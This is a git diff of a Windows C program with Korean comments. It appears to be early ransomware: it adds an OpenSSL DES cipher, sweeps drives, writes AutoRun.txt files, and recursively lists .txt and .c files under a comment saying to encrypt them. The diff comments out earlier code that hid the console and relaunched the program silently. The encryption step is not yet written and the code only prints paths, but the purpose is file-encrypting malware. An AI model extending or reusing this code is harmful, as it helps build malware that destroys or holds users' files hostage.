@@ -5,26 +5,33 @@
 #include <string.h> 
 #include <windows.h> 
 #include <io.h>// 파일찾기 
+#include<openssl/evp.h>
+
 #define PATH_SIZE 1000 
 
+typedef struct _finddata_t FILE_DATA;
+
+void CheckDevice(void);
+void FileList(char *path, char* ext, int search);
+void GetfileList(char* path);
 
 int main(int argc, char** argv) {
 
-
+	EVP_CIPHER *c= EVP_des_cbc();
 	// 현재 프로그램 주소로 시작 프로그램 등록 
 	//SetStartProgram(argv[0]); 
 
 	//////여기부터
 	//콘솔창 안보이게 
-	HWND hWndConsole = GetConsoleWindow(); //윈도우 핸들 콘솔창 호출 https://docs.microsoft.com/ko-kr/windows/console/getconsolewindow
-	ShowWindow(hWndConsole, SW_HIDE); //선택한 윈도우 창을 숨긴다 https://m.blog.naver.com/PostView.nhn?blogId=hol_ding&logNo=60197712451&proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F
-	
+	//HWND hWndConsole = GetConsoleWindow(); //윈도우 핸들 콘솔창 호출 https://docs.microsoft.com/ko-kr/windows/console/getconsolewindow
+	//ShowWindow(hWndConsole, SW_HIDE); //선택한 윈도우 창을 숨긴다 https://m.blog.naver.com/PostView.nhn?blogId=hol_ding&logNo=60197712451&proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F
+
 	//printf("hello world\n");
 
- 	CheckDevice();
+	CheckDevice();
 
 	//창이 안보이게 파일을 열음 
-	ShellExecute(NULL, "open", argv[0], NULL, NULL, SW_HIDE);  //지정된 파일에 대한 분석 수행        https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea 
+	//ShellExecute(NULL, "open", argv[0], NULL, NULL, SW_HIDE);  //지정된 파일에 대한 분석 수행        https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea 
 			//창핸들 선택//편집//파일탐험//발견//열기
 	/////여기까지 함수 분석해서 
 }
@@ -47,25 +54,77 @@ void CheckDevice(void) {
 
 	char *test = "test check device";
 	while (ch != 'D') {
-		printf("%c 드라이브 탐색중...\n",ch);
+		printf("%c 드라이브 탐색중...\n", ch);
 		sprintf(pos, "%c:\\AutoRun.txt", ch);
 
 		if ((fp = fopen(pos, "w")) != NULL) {
 			sprintf(pos, "%c:", ch);
 
 			fwrite(test, 1, strlen(test), fp);
-			//printf("%c 디스크 탐색 시작\n", ch);
-			/*for(i=0; i<2; i++) {
-			   FileList(pos, "pptx", i);
-			   FileList(pos, "hwp", i);
-			   FileList(pos, "c", i);
-			   FileList(pos, "html", i);
-			}*/
-
+			printf("%c 디스크 탐색 시작\n", ch);
 			
+			for(i=0; i<2; i++) {
+				FileList(pos,"txt", i);
+				FileList(pos, "c", i);
+			//	FileList(pos, "pptx", i);
+			//	FileList(pos, "hwp", i);
+			//	FileList(pos, "html", i);
+			}
+
+
 
 		}
 		ch--;
 	}
 }
 
+
+//재귀함수 형태로 path 안에 있는 모든 하위 경로 탐색
+void FileList(char *path, char* ext, int search) {
+
+	char newPath[PATH_SIZE];
+	FILE_DATA fd;
+	long handle;
+	int result = 1;	
+
+	//search 0 - 폴더 탐색, search 1 - ext 파일 탐색
+	if (search == 0) {
+		sprintf(newPath, "%s\\*.", path);
+	}
+	else {
+		sprintf(newPath, "%s\\*.%s", path, ext);
+	}
+
+	//Path 폴더를 열고 폴더파일이 있는지 체크
+	if ((handle = _findfirst(newPath, &fd)) == -1L) {
+		return;
+	}
+
+	//하위 경로를 모두 탐색
+	while (result != -1) {
+
+		//하위 폴더 탐색
+		if ((search == 0) && strcmp(fd.name, ".") && strcmp(fd.name, "..")) {
+			sprintf(newPath, "%s\\%s", path, fd.name);
+	
+			//하위 폴더에 있는 폴더 탐색
+			FileList(newPath, ext, 0);
+
+			//하위 폴더에 있는 ext파일 탐색
+			FileList(newPath, ext, 1);
+
+			
+		}
+		else {
+			//파일 출력!! 암호화 시키기
+				sprintf(newPath, "%s\\%s", path, fd.name);
+				printf("%s\n", newPath);
+		}
+
+		//다음 경로로 이동
+		result = _findnext(handle, &fd);
+	}
+	_findclose(handle);
+	return;
+
+}
